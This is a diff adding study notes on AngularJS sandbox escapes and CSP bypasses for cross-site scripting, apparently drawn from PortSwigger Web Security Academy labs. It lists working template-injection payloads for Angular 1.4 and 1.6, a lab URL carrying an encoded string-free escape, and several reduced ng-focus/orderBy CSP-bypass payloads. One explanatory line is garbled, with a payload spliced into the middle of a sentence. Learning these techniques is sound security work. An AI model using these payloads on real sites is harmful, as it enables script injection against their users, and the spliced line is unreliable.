@@ -534,12 +534,89 @@ Payload:
                   
 
                                     ## Escaping the sandbox
-Payload: 
+                                    
+<> Here's the final payload, tailored to Angular 1.4:
 
-{{
-    'a'.constructor.prototype.charAt=[].join;
-    $eval('x=""')+''
-}}    
+        {{
+        'a'.constructor.prototype.charAt=[].join;
+        eval('x=1} } };alert(1)//');
+        }}
+        
+        AND
+        
+        Angular 1.6
+        
+        {{constructor.constructor('alert(1)')()}}
+
+Site: https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs  // Contain Some pretty list of sandbox bypass
+
+
+                                                ## Constructing an advanced AngularJS sandbox escape
+                                                
+# So you've learned how a basic sandbox escape works, but you may encounter sites that are more restrictive with which characters they allow. 
+# For example, a site may prevent you from using double or single quotes.
+# n this situation, you need to use functions such as String.fromCharCode() to generate your characters.
+
+# In a standard sandbox escape, you would use $eval() to execute your JavaScript payload, but in the lab below, the $eval() function is undefined. 
+# Fortunately, we can use the orderBy filter instead. The typical syntax of an orderBy filter is as follows: 
+
+Payload: [123]|orderBy:'Some string'
+
+# Note that the | operator has a different meaning than in JavaScript. Normally, this is a bitwise OR operation, but in AngularJS it indicates a filter operation.
+# In the code above, we are sending the array [123] on the left to the orderBy filter on the right.
+# The colon signifies an argument to send to the filter, which in this case is a string.
+# The orderBy filter is normally used to sort an object, but it also accepts an expression, which means we can use it to pass a payload.
+
+Lab: Reflected XSS with AngularJS sandbox escape without strings
+Payload: https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+
+
+
+                                                ## How does an AngularJS CSP bypass work?
+# Content security policy (CSP) bypas<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
+
+#  Notice that the from() function is used, which allows you to convert an object to an array and call a given function (specified in the second argument) on every element of that array. 
+# ses work in a similar way to standard sandbox escapes, but usually involve some HTML injection
+# When the CSP mode is active in AngularJS, it parses template expressions differently and avoids using the Function constructor.
+# This means the standard sandbox escape described above will no longer work.
+# Depending on the specific policy, the CSP will block JavaScript events. However, AngularJS defines its own events that can be used instead.
+
+# When inside an event, AngularJS defines a special $event object, which simply references the browser event object
+# You can use this object to perform a CSP bypass.
+# On Chrome, there is a special property on the $event/event object called path.
+# This property contains an array of objects that causes the event to be executed.
+# The last property is always the window object, which we can use to perform a sandbox escape.
+# By passing this array to the orderBy filter, we can enumerate the array and use the last element (the window object) to execute a global function, such as alert(). 
+# The following code demonstrates this: 
+
+Payload: <input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
+
+# Notice that the from() function is used, which allows you to convert an object to an array and call a given function (specified in the second argument) on every element of that array. 
+# In this case, we are calling the alert() function. 
+# We cannot call the function directly because the AngularJS sandbox would parse the code and detect that the window object is being used to call a function.
+# Using the from() function instead effectively hides the window object from the sandbox, allowing us to inject malicious code. 
+
+Payload: <input id=x ng-focus=$event.path|orderBy:'CSS&&[1].map(alert)'> 
+
+# The pipe character in AngularJS signifies a filter operation so the path array is sent to the orderBy filter and this accepts an expression. 
+# I then use the CSS property to detect when the array element is currently using the last element which is window.
+# Then I use the map function to execute the alert function because the sandbox will detect window if calling alert as a normal function call. 
+
+# I challenged the audience to reduce it further and Erlend Oftedal managed to do it by replacing the CSS property with "x" which is the ID of the injected input element.
+# This works because "x" will be a global property of window and thus can be used to detect the window object.
+
+Payload: <input id=x ng-focus=$event.path|orderBy:'x&&[1].map(alert)'> 
+
+Reduced Payloads:
+1. <input id=x ng-focus=$event.path|orderBy:'x&&[alert].pop()(1)'>
+2. <input id=x ng-focus=$event.path|orderBy:'[alert].pop()(1)'>
+3. <input id=x ng-focus=$event.path|orderBy:'[alert][0](1)'>
+4. <input id=x ng-focus=$event.path|orderBy:'(y=alert)(1)'>
+
+
+
+
+
 
                           
                           
